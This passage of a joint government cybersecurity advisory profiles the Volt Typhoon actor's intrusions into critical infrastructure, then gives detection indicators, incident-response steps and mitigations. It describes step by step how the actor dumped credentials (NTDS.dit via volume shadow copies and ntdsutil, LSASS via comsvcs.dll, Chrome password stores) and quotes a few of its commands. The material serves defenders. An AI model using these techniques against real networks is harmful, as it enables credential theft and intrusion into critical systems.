Volt Typhoon uses elevated credentials for strategic network infiltration and additional discovery, often focusing on gaining capabilities to access OT assets. Volt Typhoon actors have been observed testing access to domain-joint OT assets using default OT vendor credentials, and in certain instances, they have possessed the capability to access OT systems whose credentials were compromised via NTDS.dit theft. This access enables potential disruptions, such as manipulating heating, ventilation, and air conditioning (HVAC) systems in server rooms or disrupting critical energy and water controls, leading to significant infrastructure failures (in some cases, Volt Typhoon actors had the capability to access camera surveillance systems at critical infrastructure facilities). In one confirmed compromise, Volt Typhoon actors moved laterally to a control system and were positioned to move to a second control system.


 

Figure 1: Typical Volt Typhoon Activity

After successfully gaining access to legitimate accounts, Volt Typhoon actors exhibit minimal activity within the compromised environment (except discovery as noted above), suggesting their objective is to maintain persistence rather than immediate exploitation. This assessment is supported by observed patterns where Volt Typhoon methodically re-targets the same organizations over extended periods, often spanning several years, to continuously validate and potentially enhance their unauthorized accesses. Evidence of their meticulous approach is seen in instances where they repeatedly exfiltrate domain credentials, ensuring access to current and valid accounts. For example, in one compromise, Volt Typhoon likely extracted NTDS.dit from three domain controllers in a four-year period. In another compromise, Volt Typhoon actors extracted NTDS.dit two times from a victim in a nine-month period.
Industry reporting—identifying that Volt Typhoon actors are silent on the network following credential dumping and perform discovery to learn about the environment, but do not exfiltrate data—is consistent with the U.S. authoring agencies’ observations. This indicates their aim is to achieve and maintain persistence on the network. In one confirmed compromise, an industry partner observed Volt Typhoon actors dumping credentials at regular intervals.
In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid leaving malware artifacts on systems that would cause alerts. Their strong focus on stealth and operational security allows them to maintain long-term, undiscovered persistence. Further, Volt Typhoon’s operational security is enhanced by targeted log deletion to conceal their actions within the compromised environment.
See the below sections for Volt Typhoon TTPs observed by the U.S. authoring agencies from multiple confirmed Volt Typhoon compromises.
Observed TTPs
Reconnaissance
Volt Typhoon actors conduct extensive pre-compromise reconnaissance [TA0043] to learn about the target organization [T1591], its network [T1590], and its staff [T1589]. This includes web searches [T1593]—including victim-owned sites [T1594]—for victim host [T1592], identity, and network information, especially for information on key network and IT administrators. According to industry reporting, Volt Typhoon actors use FOFA[1], Shodan, and Censys for querying or searching for exposed infrastructure. In some instances, the U.S. authoring agencies have observed Volt Typhoon actors targeting the personal emails of key network and IT staff [T1589.002] post compromise.
Resource Development
Historically, Volt Typhoon actors use multi-hop proxies for command and control (C2) infrastructure [T1090.003]. The proxy is typically composed of virtual private servers (VPSs) [T1583.003] or small office/home office (SOHO) routers. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. (See DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure for more information).
Initial Access
To obtain initial access [TA0001], Volt Typhoon actors commonly exploit vulnerabilities in networking appliances such as those from Fortinet, Ivanti Connect Secure (formerly Pulse Secure), NETGEAR, Citrix, and Cisco [T1190]. They often use publicly available exploit code for known vulnerabilities [T1588.005] but are also adept at discovering and exploiting zero-day vulnerabilities [T1587.004].

In one confirmed compromise, Volt Typhoon actors likely obtained initial access by exploiting CVE-2022-42475 in a network perimeter FortiGate 300D firewall that was not patched. There is evidence of a buffer overflow attack identified within the Secure Sockets Layer (SSL)-VPN crash logs.

Once initial access is achieved, Volt Typhoon actors typically shift to establishing persistent access [TA0003]. They often use VPN sessions to securely connect to victim environments [T1133], enabling discreet follow-on intrusion activities. This tactic not only provides a stable foothold in the network but also allows them to blend in with regular traffic, significantly reducing their chances of detection.
Execution
Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line [T1059] and other native tools and processes on systems [T1218] (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some “commands appear to be exploratory or experimental, as the operators [i.e., malicious actors] adjust and repeat them multiple times.”[2]
For more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity.
Similar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes for the current user’s operating system (OS) credentials).
The actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control section).
Persistence
Volt Typhoon primarily relies on valid credentials for persistence [T1078].
Defense Evasion
Volt Typhoon has strong operational security. Their actors primarily use LOTL for defense evasion [TA0005], which allows them to camouflage their malicious activity with typical system and network behavior, potentially circumventing simplistic endpoint security capabilities. For more information, see joint guide Identifying and Mitigating Living off the Land Techniques.
Volt Typhoon actors also obfuscate their malware. In one confirmed compromise, Volt Typhoon obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX) [T1027.002]. FRP client applications support encryption, compression, and easy token authentication and work across multiple protocols—including transmission control protocol (TCP), user datagram protocol (UDP), hypertext transfer protocol (HTTP), and hypertext transfer protocol secure (HTTPS). The FRP client applications use the Kuai connection protocol (KCP) for error-checked and anonymous data stream delivery over UDP, with packet-level encryption support. See Appendix C and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information.
In addition to LOTL and obfuscation techniques, Volt Typhoon actors have been observed selectively clearing Windows Event Logs [T1070.001], system logs, and other technical artifacts to remove evidence [T1070.009] of their intrusion activity and masquerading file names [T1036.005].
Credential Access
Volt Typhoon actors first obtain credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities [T1068] in the operating system or network services. In some cases, they have obtained credentials insecurely stored on the appliance [T1552]. In one instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt Typhoon actors compromised a domain admin account stored inappropriately on the device.
Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database file (NTDS.dit)—in some cases multiple times from the same victim over long periods [T1003.003]. NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, essentially allowing for full domain compromise if the hashes can be cracked offline.
To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon:

Move laterally [TA0008] to the domain controller via an interactive RDP session using a compromised account with domain administrator privileges [T1021.001];
Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy;
Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume shadow copy; and
Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) [T1110.002]. (For more details, including specific commands used, see Appendix A: Volt Typhoon LOTL Activity.)Note: A volume shadow copy contains a copy of all the files and folders that exist on the specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file.

Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY profiles that allow access to critical systems (see the Lateral Movement section).
According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS (see Appendix B for commands used).[2]
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]

Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run Mimikatz after leveraging a compromised administrator account to deploy it.
Impacket is an open source Python toolkit for programmatically constructing and manipulating network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks—as well as remote service execution.

Discovery
Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances already present on the system for system information [T1082], network service [T1046], group [T1069] and user [T1033] discovery.
Volt Typhoon uses at least the following LOTL tools and commands for system information, network service, group, and user discovery techniques:





cmd
certutil
dnscmd
ldifde
makecab
net user/group/use
netsh




nltest
netstat
ntdsutil
ping
PowerShell
quser
reg query/reg save




systeminfo
tasklist
wevtutil
whoami
wmic
xcopy





Some observed specific examples of discovery include:

Capturing successful logon events [T1654].

Specifically, in one incident, analysis of the PowerShell console history of a domain controller indicated that security event logs were directed to a file named user.dat, as evidenced by the executed command Get-EventLog security -instanceid 4624 -after [year-month-date] | fl * | Out-File 'C:\users\public\documents\user.dat'. This indicates the group's specific interest in capturing successful logon events (event ID 4624) to analyze user authentication patterns within the network. Additionally, file system analysis, specifically of the Master File Table (MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in C:\Users\Public\Documents but subsequently deleted [T1070.004]. The presence of these activities suggests a methodical approach by Volt Typhoon actors in collecting and then possibly removing traces of sensitive log information from the compromised system.


Executing tasklist /v to gather a detailed process listing [T1057], followed by executing taskkill /f /im rdpservice.exe (the function of this executable is not known).
Executing net user and quser for user account information [T1087.001].
Creating and accessing a file named rult3uil.log on a domain controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information [T1010] and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.
Employing ping with various IP addresses to check network connectivity [T1016.001] and net start to list running services [T1007].

See Appendix A for additional LOTL examples.
In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which was on the network for admin use, to scan the network.
Volt Typhoon actors have been observed strategically targeting network administrator web browser data—focusing on both browsing history and stored credentials [T1555.003]—to facilitate targeting of personal email addresses (see the Reconnaissance section) for further discovery and possible network modifications that may impact the threat actor’s persistence within victim networks.
In one confirmed compromise:

Volt Typhoon actors obtained the history file from the User Data directory of a network administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first executed an RDP session to the user’s workstation where they initially attempted, and failed, to obtain the C$ File Name: users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event log. The threat actors then disconnected the RDP session to the workstation and accessed the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration [T1074]. Shortly after accessing the history.zip file, the actors terminated RDP sessions.
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption Standard (AES) encryption key [T1552.004] used to encrypt the passwords stored in the Chrome browser, which would enable the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.

In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and Edge user data on multiple systems. Directory interaction was observed over the network to paths such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated several directories, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings [T1083].
Lateral Movement
For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550].
In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections).
Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems [T1563]. See Figure 2.

 

Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets

Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag.
Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from non-associated IP addresses, with no definitive link to Volt Typhoon.
Collection and Exfiltration
The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate follow-on actions with physical impacts. For example, in one confirmed compromise, they collected [TA0009] sensitive information obtained from a file server in multiple zipped files [T1560] and likely exfiltrated [TA0010] the files via Server Message Block (SMB) [T1048] (see Figure 3). Collected information included diagrams and documentation related to OT equipment, including supervisory control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering intelligence that could be leveraged in actions targeting physical assets and systems.

 

Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server

In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) obtained from two DCs. They then compressed and archived the extracted ntds.dit and accompanying registry files by executing ronf.exe, which was likely a renamed version of the archive utility rar.exe) [T1560.001].
Command and Control
Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure).
They have also been observed setting up FRP clients [T1090] on a victim’s corporate infrastructure to establish covert communications channels [T1573] for command and control. In one instance, Volt Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has additional capabilities. The FRP client can locate servers behind a network firewall or obscured through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bi-directionally stream data over NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information.
In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon’s proxy infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic [T1584.004] (see Appendix B for details).
DETECTION/HUNT RECOMMENDATIONS
Apply Living off the Land Detection Best Practices
Apply the prioritized detection and hardening best practice recommendations provided in joint guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack security and network management best practices (such as established baselines) that support detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.
Review Application, Security, and System Event Logs
Routinely review application, security, and system event logs, focusing on Windows Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability for long-term undetected persistence, network defenders should assume significant dwell time and review specific application event log IDs, which remain on endpoints for longer periods compared to security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit.
See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please note that incidents may not always have exact matches listed in the Event Detail column due to variations in event logging and TTPs.

Table 1: Key Log Indicators for Detecting Volt Typhoon Activity


Event ID (Log)
Event Detail
Description




216 (Windows ESENT Application Log)
A database location change was detected from 'C:\Windows\NTDS\ntds.dit' to '\\?\GLOBALROOT\Device\{redacted}VolumeShadowCopy1\Windows\NTDS\ntds.dit'
A change in the NTDS.dit database location is detected. This could suggest an initial step in NTDS credential dumping where the database is being prepared for extraction.


325 (Windows ESENT Application Log)
The database engine created a new database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit).
Indicates creation of a new NTDS.dit file in a non-standard directory. Often a sign of data staging for exfiltration. Monitor for unusual database operations in temp directories.


637 (Windows ESENT Application Log)
C:\Windows\Temp\tmp\Active Directory\ntds.jfm-++- (0) New flush map file “C:\Windows\Temp\tmp\Active Directory\ntds.jfm” will be created to enable persisted lost flush detection.
A new flush map file is being created for NTDS.dit. This may suggest ongoing operations related to NTDS credential dumping, potentially capturing uncommitted changes to the NTDS.dit file.


326 (Windows ESENT Application Log)

NTDS-++-12460,D,100-++--++-1-++-
C:\$SNAP_{redacted}_VOLUMEC$\Windows\NTDS\ntds.dit-++-0-++- [1] The database engine attached a database. Began mounting of C:\Windows\NTDS\ntds.dit file created from volume shadow copy process

Represents the mounting of an NTDS.dit file from a volume shadow copy. This is a critical step in NTDS credential dumping, indicating active manipulation of a domain controller’s data.


327 (Windows ESENT Application Log)
C:\Windows\Temp\tmp\Active Directory\ntds.dit-++-1-++- [1] The database engine detached a database (2, C:\Windows\Temp\tmp\Active Directory\ntds.dit). Completion of mounting of ntds.dit file to C:\Windows\Temp\tmp\Active Director
The detachment of a database, particularly in a temp directory, could indicate the completion of a credential dumping process, potentially as part of exfiltration preparations.


21 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session logon succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful authentication to a Remote Desktop Services session.


22 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Shell start notification received: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful start of a new Remote Desktop session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.


23 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session logoff succeeded: User: {redacted}\{redacted} Session ID: {redacted}
Successful logoff of Remote Desktop session.


24 (Windows Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session has been disconnected: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Remote Desktop session disconnected by user or due to network connectivity issues.


25 (Windows  Terminal Services Local Session Manager Operational Log)
Remote Desktop Services: Session reconnection succeeded: User: {redacted}\{redacted} Session ID: {redacted} Source Network Address: {redacted}
Successful reconnection to a Remote Desktop Services session. This may imply lateral movement or unauthorized remote access, especially if the user or session is unexpected.


1017 (Windows System Log)

Handle scavenged.
Share Name: C$
File Name:
users\{redacted}\downloads\History.zip Durable: 1 Resilient or Persistent: 0 Guidance: The server closed a handle that was previously reserved for a client after 60 seconds.

Indicates the server closed a handle for a client. While common in network operations, unusual patterns or locations (like History.zip in a user’s downloads) may suggest data collection from a local system.


1102 (Windows Security Log)
All
All Event ID 1102 entries should be investigated as logs are generally not cleared and this is a known Volt Typhoon tactic to cover their tracks.



Monitor and Review OT System Logs

Review access logs for communication paths between IT and OT networks, looking for anomalous accesses or protocols.
Measure the baseline of normal operations and network traffic for the industrial control system (ICS) and assess traffic anomalies for malicious activity.
Configure intrusion detection systems (IDS) to create alarms for any ICS network traffic outside normal operations.
Track and monitor audit trails on critical areas of ICS.
Set up security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.

Review CISA’s Recommended Cybersecurity Practices for Industrial Control Systems and the joint advisory, NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, for further OT system detection and mitigation guidance.
Use gait to Detect Possible Network Proxy Activities
Use gait[4] to detect network proxy activities. Developed by Sandia National Labs, gait is a publicly available Zeek[5] extension. The gait extension can help enrich Zeek’s network connection monitoring and SSL logs by including additional metadata in the logs. Specifically, gait captures unique TCP options and timing data such as a TCP, transport layer security (TLS), and Secure Shell (SSH) layer inferred round trip times (RTT), aiding in the identification of the software used by both endpoints and intermediaries.
While the gait extension for Zeek is an effective tool for enriching network monitoring logs with detailed metadata, it is not specifically designed to detect Volt Typhoon actor activities. The extension’s capabilities extend to general anomaly detection in network traffic, including—but not limited to—proxying activities. Therefore, while gait can be helpful in identifying tactics similar to those used by Volt Typhoon, such as proxy networks and FRP clients for C2 communication, not all proxying activities detected by using this additional metadata are necessarily indicative of Volt Typhoon presence. It serves as a valuable augmentation to current security stacks for a broader spectrum of threat detection.
For more information, see Sandia National Lab’s gait GitHub page sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies.
Review Logins for Impossible Travel
Examine VPN or other account logon times, frequency, duration, and locations. Logons from two geographically distant locations within a short timeframe from a single user may indicate an account is being used maliciously. Logons of unusual frequency or duration may indicate a threat actor attempting to access a system repeatedly or maintain prolonged sessions for the purpose of data extraction.
Review Standard Directories for Unusual Files
Review directories, such as C:\windows\temp\ and C:\users\public\, for unexpected or unusual files. Monitor these temporary file storage directories for files typically located in standard system paths, such as the System32 directory. For example, Volt Typhoon has been observed downloading comsvcs.dll to a non-standard folder (this file is normally found in the System32 folder).
INCIDENT RESPONSE
If compromise, or potential compromise, is detected, organizations should assume full domain compromise because of Volt Typhoon’s known behavioral pattern of extracting the NTDS.dit from the DCs. Organizations should immediately implement the following immediate, defensive countermeasures:

Sever the enterprise network from the internet. Note: this step requires the agency to understand its internal and external connections. When making the decision to sever internet access, knowledge of connections must be combined with care to avoid disrupting critical functions.

If you cannot sever from the internet, shutdown all non-essential traffic between the affected enterprise network and the internet.


Reset credentials of privileged and non-privileged accounts within the trust boundary of each compromised account.

Reset passwords for all domain users and all local accounts, such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The krbtgt account should be reset twice because the account has a two-password history. The first account reset for the krbtgt needs to be allowed to replicate prior to the second reset to avoid any issues. See CISA’s Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise for more information. Although tailored to FCEB agencies compromised in the 2020 SolarWinds Orion supply chain compromise, the steps are applicable to organizations with Windows AD compromise.

Review access policies to temporarily revoke privileges/access for affected accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.


Reset the relevant account credentials or access keys if the investigation finds the threat actor’s access is limited to non-elevated permissions.

Monitor related accounts, especially administrative accounts, for any further signs of unauthorized access.




Audit all network appliance and edge device configurations with indicators of malicious activity for signs of unauthorized or malicious configuration changes. Organizations should ensure they audit the current network device running configuration and any local configurations that could be loaded at boot time. If configuration changes are identified:

Change all credentials being used to manage network devices, to include keys and strings used to secure network device functions (SNMP strings/user credentials, IPsec/IKE preshared keys, routing secrets, TACACS/RADIUS secrets, RSA keys/certificates, etc.).
Update all firmware and software to the latest version.


Report the compromise to an authoring agency (see the Contact Information section).
For organizations with cloud or hybrid environments, apply best practices for identity and credential access management. 

Verify that all accounts with privileged role assignments are cloud native, not synced from Active Directory.
Audit conditional access policies to ensure Global Administrators and other highly privileged service principals and accounts are not exempted.
Audit privileged role assignments to ensure adherence to the principle of least privilege when assigning privileged roles.
Leverage just-in-time and just-enough access mechanisms when administrators need to elevate to a privileged role.
In hybrid environments, ensure federated systems (such as AD FS) are configured and monitored properly.
Audit Enterprise Applications for recently added applications and examine the API permissions assigned to each.


Reconnect to the internet. Note: The decision to reconnect to the internet depends on senior leadership’s confidence in the actions taken. It is possible—depending on the environment—that new information discovered during pre-eviction and eviction steps could add additional eviction tasks.
Minimize and control use of remote access tools and protocols by applying best practices from joint Guide to Securing Remote Access Software and joint Cybersecurity Information Sheet: Keeping PowerShell: Security Measures to Use and Embrace.
Consider sharing technical information with an authoring agency and/or a sector-specific information sharing and analysis center.

For more information on incident response and remediation, see:

Joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity. This advisory provides incident response best practices.
CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to U.S. Federal Civilian Executive Branch (FCEB) agencies, the playbooks are applicable to all organizations. The incident response playbook provides procedures to identify, coordinate, remediate, recover, and track successful mitigations from incidents.
Joint Water and Wastewater Sector - Incident Response Guide. This joint guide provides incident response best practices and information on federal resources for Water and Wastewater Systems Sector organizations.

MITIGATIONS
These mitigations are intended for IT administrators in critical infrastructure organizations. The authoring agencies recommend that software manufactures incorporate secure by design and default principles and tactics into their software development practices to strengthen the security posture for their customers.
For information on secure by design practices that may protect customers against common Volt Typhoon techniques, see joint guide Identifying and Mitigating Living off the Land Techniques and joint Secure by Design Alert Security Design Improvements for SOHO Device Manufacturers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of Volt Typhoon activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
IT Network Administrators and Defenders
Harden the Attack Surface

Apply patches for internet-facing systems within a risk-informed span of time [CPG 1E]. Prioritize patching critical assets, known exploited vulnerabilities, and vulnerabilities in appliances known to be frequently exploited by Volt Typhoon (e.g., Fortinet, Ivanti, NETGEAR, Citrix, and Cisco devices).
Apply vendor-provided or industry standard hardening guidance to strengthen software and system configurations. Note: As part of CISA’s Secure by Design campaign, CISA urges software manufacturers to prioritize secure by default configurations to eliminate the need for customer implementation of hardening guidelines.
Maintain and regularly update an inventory of all organizational IT assets [CPG 1A].
Use third party assessments to validate current system and network security compliance via security architecture reviews, penetration tests, bug bounties, attack surface management services, incident simulations, or table-top exercises (both announced and unannounced) [CPG 1F].
Limit internet exposure of systems when not necessary. An organization’s primary attack surface is the combination of the exposure of all its internet-facing systems. Decrease the attack surface by not exposing systems or management interfaces to the internet when not necessary.
Plan “end of life” for technology beyond manufacturer supported lifecycle. Inventories of organizational assets should be leveraged in patch and configuration management as noted above. Inventories will also enable identification of technology beyond the manufacturer’s supported lifecycle. Where technology is beyond “end of life” or “end of support,” additional cybersecurity vigilance is necessary, and may warrant one or more of the following:

Supplemental support agreements;
Additional scanning and testing;
Configuration changes;
Isolation;
Segmentation; and
Development of forward-looking plans to facilitate replacement.



Secure Credentials

Do not store credentials on edge appliances/devices. Ensure edge devices do not contain accounts that could provide domain admin access.
Do not store plaintext credentials on any system [CPG 2L]. Credentials should be stored securely—such as with a credential/password manager or vault, or other privileged account management solutions—so they can only be accessed by authenticated and authorized users.
Change default passwords [CPG 2A] and ensure they meet the policy requirements for complexity.
Implement and enforce an organizational system-enforced policy that:

Requires passwords for all IT password-protected assets to be at least 15 characters;
Does not allow users to reuse passwords for accounts, applications, services, etc., [CPG 2C]; and
Does not allow service accounts/machine accounts to reuse passwords from member user accounts.


Configure Group Policy settings to prevent web browsers from saving passwords and disable autofill functions.
Disable the storage of clear text passwords in LSASS memory.

Secure Accounts

Implement phishing-resistant MFA for access to assets [CPG 2H].
Separate user and privileged accounts.

User accounts should never have administrator or super-user privileges [CPG 2E].
Administrators should never use administrator accounts for actions and activities not associated with the administrator role (e.g., checking email, web browsing).


Enforce the principle of least privilege.

Ensure administrator accounts only have the minimum permissions necessary to complete their tasks.
Review account permissions for default/accounts for edge appliances/devices and remove domain administrator privileges, if identified.
Significantly limit the number of users with elevated privileges. Implement continuous monitoring for changes in group membership, especially in privileged groups, to detect and respond to unauthorized modifications.
Remove accounts from high-privilege groups like Enterprise Admins and Schema Admins. Temporarily reinstate these privileges only when necessary and under strict auditing to reduce the risk of privilege abuse.
Transition to Group Managed Service Accounts (gMSAs) where suitable for enhanced management and security of service account credentials. gMSAs provide automated password management and simplified Service Principal Name (SPN) management, enhancing security over traditional service accounts. See Microsoft’s Group Managed Service Accounts Overview.


Enforce strict policies via Group Policy and User Rights Assignments to limit high-privilege service accounts.
Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources [CPG 2L]. PAM solutions can also log and alert usage to detect any unusual activity.
Complement the PAM solution with role-based access control (RBAC) for tailored access based on job requirements. This ensures that elevated access is granted only when required and for a limited duration, minimizing the window of opportunity for abuse or exploitation of privileged credentials.
Implement an Active Directory tiering model to segregate administrative accounts based on their access level and associated risk. This approach reduces the potential impact of a compromised account. See Microsoft’s PAM environment tier model.
Harden administrative workstations to only permit administrative activities from workstations appropriately hardened based on the administrative tier. See Microsoft’s Why are privileged access devices important - Privileged access.
Disable all user accounts and access to organizational resources of employees on the day of their departure [CPG 2G]
Regularly audit all user, admin, and service accounts and remove or disable unused or unneeded accounts as applicable.
Regularly roll NTLM hashes of accounts that support token-based authentication.
Improve management of hybrid (cloud and on-premises) identity federation by:

